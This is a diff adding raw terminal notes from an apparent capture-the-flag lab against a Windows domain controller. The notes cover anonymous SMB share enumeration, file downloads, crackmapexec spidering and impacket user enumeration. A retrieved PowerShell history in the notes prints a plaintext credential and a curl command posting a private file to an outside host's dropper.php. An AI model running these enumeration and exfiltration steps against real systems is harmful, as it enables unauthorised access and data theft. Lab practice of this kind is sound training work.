@@ -1,0 +1,121 @@
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient -L //10.201.86.211/ -N
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	Docs            Disk      
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      Users Share. Do Not Touch!
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.201.86.211 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient //10.201.86.211/Users -N
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                  DR        0  Thu Mar 11 21:11:49 2021
+  ..                                 DR        0  Thu Mar 11 21:11:49 2021
+  Administrator                       D        0  Thu Mar 11 16:55:48 2021
+  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
+  atlbitbucket                        D        0  Thu Mar 11 17:53:06 2021
+  bitbucket                           D        0  Thu Mar 11 21:11:51 2021
+  Default                           DHR        0  Thu Mar 11 19:18:03 2021
+  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
+  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
+  LAB-ADMIN                           D        0  Thu Mar 11 19:28:14 2021
+  Public                             DR        0  Thu Mar 11 16:27:02 2021
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# smbclient //10.201.86.211/Docs -N 
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Sun Mar 14 22:47:35 2021
+  ..                                  D        0  Sun Mar 14 22:47:35 2021
+  RSA-Secured-Credentials.xlsx        A    15360  Sun Mar 14 22:46:54 2021
+  RSA-Secured-Document-PII.docx       A    18432  Sun Mar 14 22:45:24 2021
+
+		15587583 blocks of size 4096. 9910295 blocks available
+smb: \> get RSA-Secured-
+RSA-Secured-Credentials.xlsx   RSA-Secured-Document-PII.docx  
+smb: \> get RSA-Secured-
+RSA-Secured-Credentials.xlsx   RSA-Secured-Document-PII.docx  
+smb: \> get RSA-Secured-Credentials.xlsx
+getting file \RSA-Secured-Credentials.xlsx of size 15360 as RSA-Secured-Credentials.xlsx (138.9 KiloBytes/sec) (average 138.9 KiloBytes/sec)
+smb: \> get RSA-Secured-Document-PII.docx 
+getting file \RSA-Secured-Document-PII.docx of size 18432 as RSA-Secured-Document-PII.docx (95.7 KiloBytes/sec) (average 111.5 KiloBytes/sec)
+
+
+these cannot be cracked. 
+
+we can either recurse ON and ls the whole Users drive
+or
+┌──(root㉿kali)-[/tmp/cme_spider_plus]
+└─# crackmapexec smb 10.201.86.211 -u 'anonymous' -p '' -M spider_plus -o READ_ONLY=true
+SMB         10.201.86.211   445    LAB-DC           [*] Windows 10 / Server 2019 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)
+SMB         10.201.86.211   445    LAB-DC           [+] LAB.ENTERPRISE.THM\anonymous: 
+SPIDER_P... 10.201.86.211   445    LAB-DC           [*] Started spidering plus with option:
+SPIDER_P... 10.201.86.211   445    LAB-DC           [*]        DIR: ['print$']
+SPIDER_P... 10.201.86.211   445    LAB-DC           [*]        EXT: ['ico', 'lnk']
+SPIDER_P... 10.201.86.211   445    LAB-DC           [*]       SIZE: 51200
+SPIDER_P... 10.201.86.211   445    LAB-DC           [*]     OUTPUT: /tmp/cme_spider_plus
+
+
+
+┌──(root㉿kali)-[/tmp/cme_spider_plus/10.201.86.211]
+└─# tree
+
+
+
+smb: \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\> get Consolehost_hisory.txt 
+getting file \LAB-ADMIN\AppData\Roaming\Microsoft\Windows\Powershell\PSReadLine\Consolehost_hisory.txt of size 424 as Consolehost_hisory.txt (5.7 KiloBytes/sec) (average 5.7 KiloBytes/sec)
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# cat Consolehost_hisory.txt      
+cd C:\
+mkdir monkey
+cd monkey
+cd ..
+cd ..
+cd ..
+cd D:
+cd D:
+cd D:
+D:\
+mkdir temp
+cd temp
+echo "replication:101RepAdmin123!!">private.txt
+Invoke-WebRequest -Uri http://1.215.10.99/payment-details.txt
+more payment-details.txt
+curl -X POST -H 'Cotent-Type: ascii/text' -d .\private.txt' http://1.215.10.99/dropper.php?file=itsdone.txt
+del private.txt
+del payment-details.txt
+cd ..
+del temp
+cd C:\
+C:\
+exit                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+┌──(root㉿kali)-[/home/kali]
+└─# impacket-lookupsid anonymous@10.201.86.211 -no-pass | awk -F'\\\\' '/SidTypeUser/{sub(/ .*/,"",$2); print $2}' > users    
+                                                                      
+
+
+
+
+
+
+
+
